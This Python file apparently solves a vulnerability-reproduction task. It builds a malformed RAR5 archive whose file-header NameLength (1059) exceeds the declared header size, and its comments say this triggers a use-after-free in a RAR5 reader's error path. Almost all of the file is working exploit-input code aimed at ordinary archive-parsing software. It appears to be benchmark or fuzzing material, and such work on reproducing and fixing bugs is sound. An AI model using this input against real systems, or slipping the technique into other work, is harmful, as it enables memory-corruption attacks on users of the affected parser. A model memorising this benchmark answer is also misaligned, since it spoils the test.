import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def to_vint(val):
            if val == 0:
                return b'\x00'
            out = b''
            while val >= 0x80:
                out += bytes([(val & 0x7f) | 0x80])
                val >>= 7
            out += bytes([val])
            return out

        # RAR5 Signature
        sig = b"\x52\x61\x72\x21\x1A\x07\x01\x00"

        # --- Main Archive Header (Type 1) ---
        # Fields: Type(1), Flags(0), ArchFlags(0)
        mh_fields = to_vint(1) + to_vint(0) + to_vint(0)
        mh_size = len(mh_fields)
        mh_raw = to_vint(mh_size) + mh_fields
        mh_crc = zlib.crc32(mh_raw) & 0xFFFFFFFF
        mh_block = struct.pack('<I', mh_crc) + mh_raw

        # --- File Header (Type 2) ---
        # Vulnerability Logic:
        # The RAR5 reader reads the NameLength, allocates memory, reads the Name,
        # and ONLY THEN checks if the NameLength is valid (e.g. fits within the header block).
        # We construct a header where NameLength (1059) > Declared Header Size (~9).
        # This forces the parser to read data from the stream that logicallly shouldn't belong to the name,
        # triggering the validation error after allocation/read. The error path leads to UAF.
        
        # Target length is 1089 bytes.
        # Overhead: Sig(8) + MH(8) + FH_Header(14) = 30 bytes.
        # Name Data: 1089 - 30 = 1059 bytes.
        name_len = 1059
        name_data = b'A' * name_len

        # File Header Fields
        # Order: FileFlags, UnpackedSize, Attributes, Compression, HostOS, NameLength
        fh_fields = (
            to_vint(0) + # FileFlags
            to_vint(0) + # UnpackedSize
            to_vint(0) + # Attributes
            to_vint(0) + # Compression
            to_vint(0) + # HostOS
            to_vint(name_len)
        )
        
        # Block Header content
        fh_type = 2
        fh_flags = 0 
        fh_content = to_vint(fh_type) + to_vint(fh_flags) + fh_fields
        
        # We declare the header size to match the content ONLY (excluding the name data)
        # This makes the "NameLength > remaining_header_size" check fail.
        declared_size = len(fh_content)
        
        fh_raw = to_vint(declared_size) + fh_content
        fh_crc = zlib.crc32(fh_raw) & 0xFFFFFFFF
        fh_block = struct.pack('<I', fh_crc) + fh_raw
        
        return sig + mh_block + fh_block + name_data
